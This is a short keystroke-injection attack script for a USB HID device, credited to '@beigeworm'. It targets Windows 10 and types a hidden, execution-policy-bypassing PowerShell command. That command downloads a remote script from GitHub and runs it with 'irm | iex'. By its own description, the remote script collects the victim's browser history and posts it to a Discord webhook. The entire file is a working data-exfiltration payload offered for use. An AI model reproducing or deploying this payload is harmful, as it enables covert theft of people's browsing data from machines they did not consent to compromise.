// Title: beigeworm's browser history to Discord Webhook.
// Author: @beigeworm
// Description: This script collects browser history and posts results to a discord webhook.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Browser-History-to-Discord/main.ps1 | iex");
delay(500);
press("ENTER");
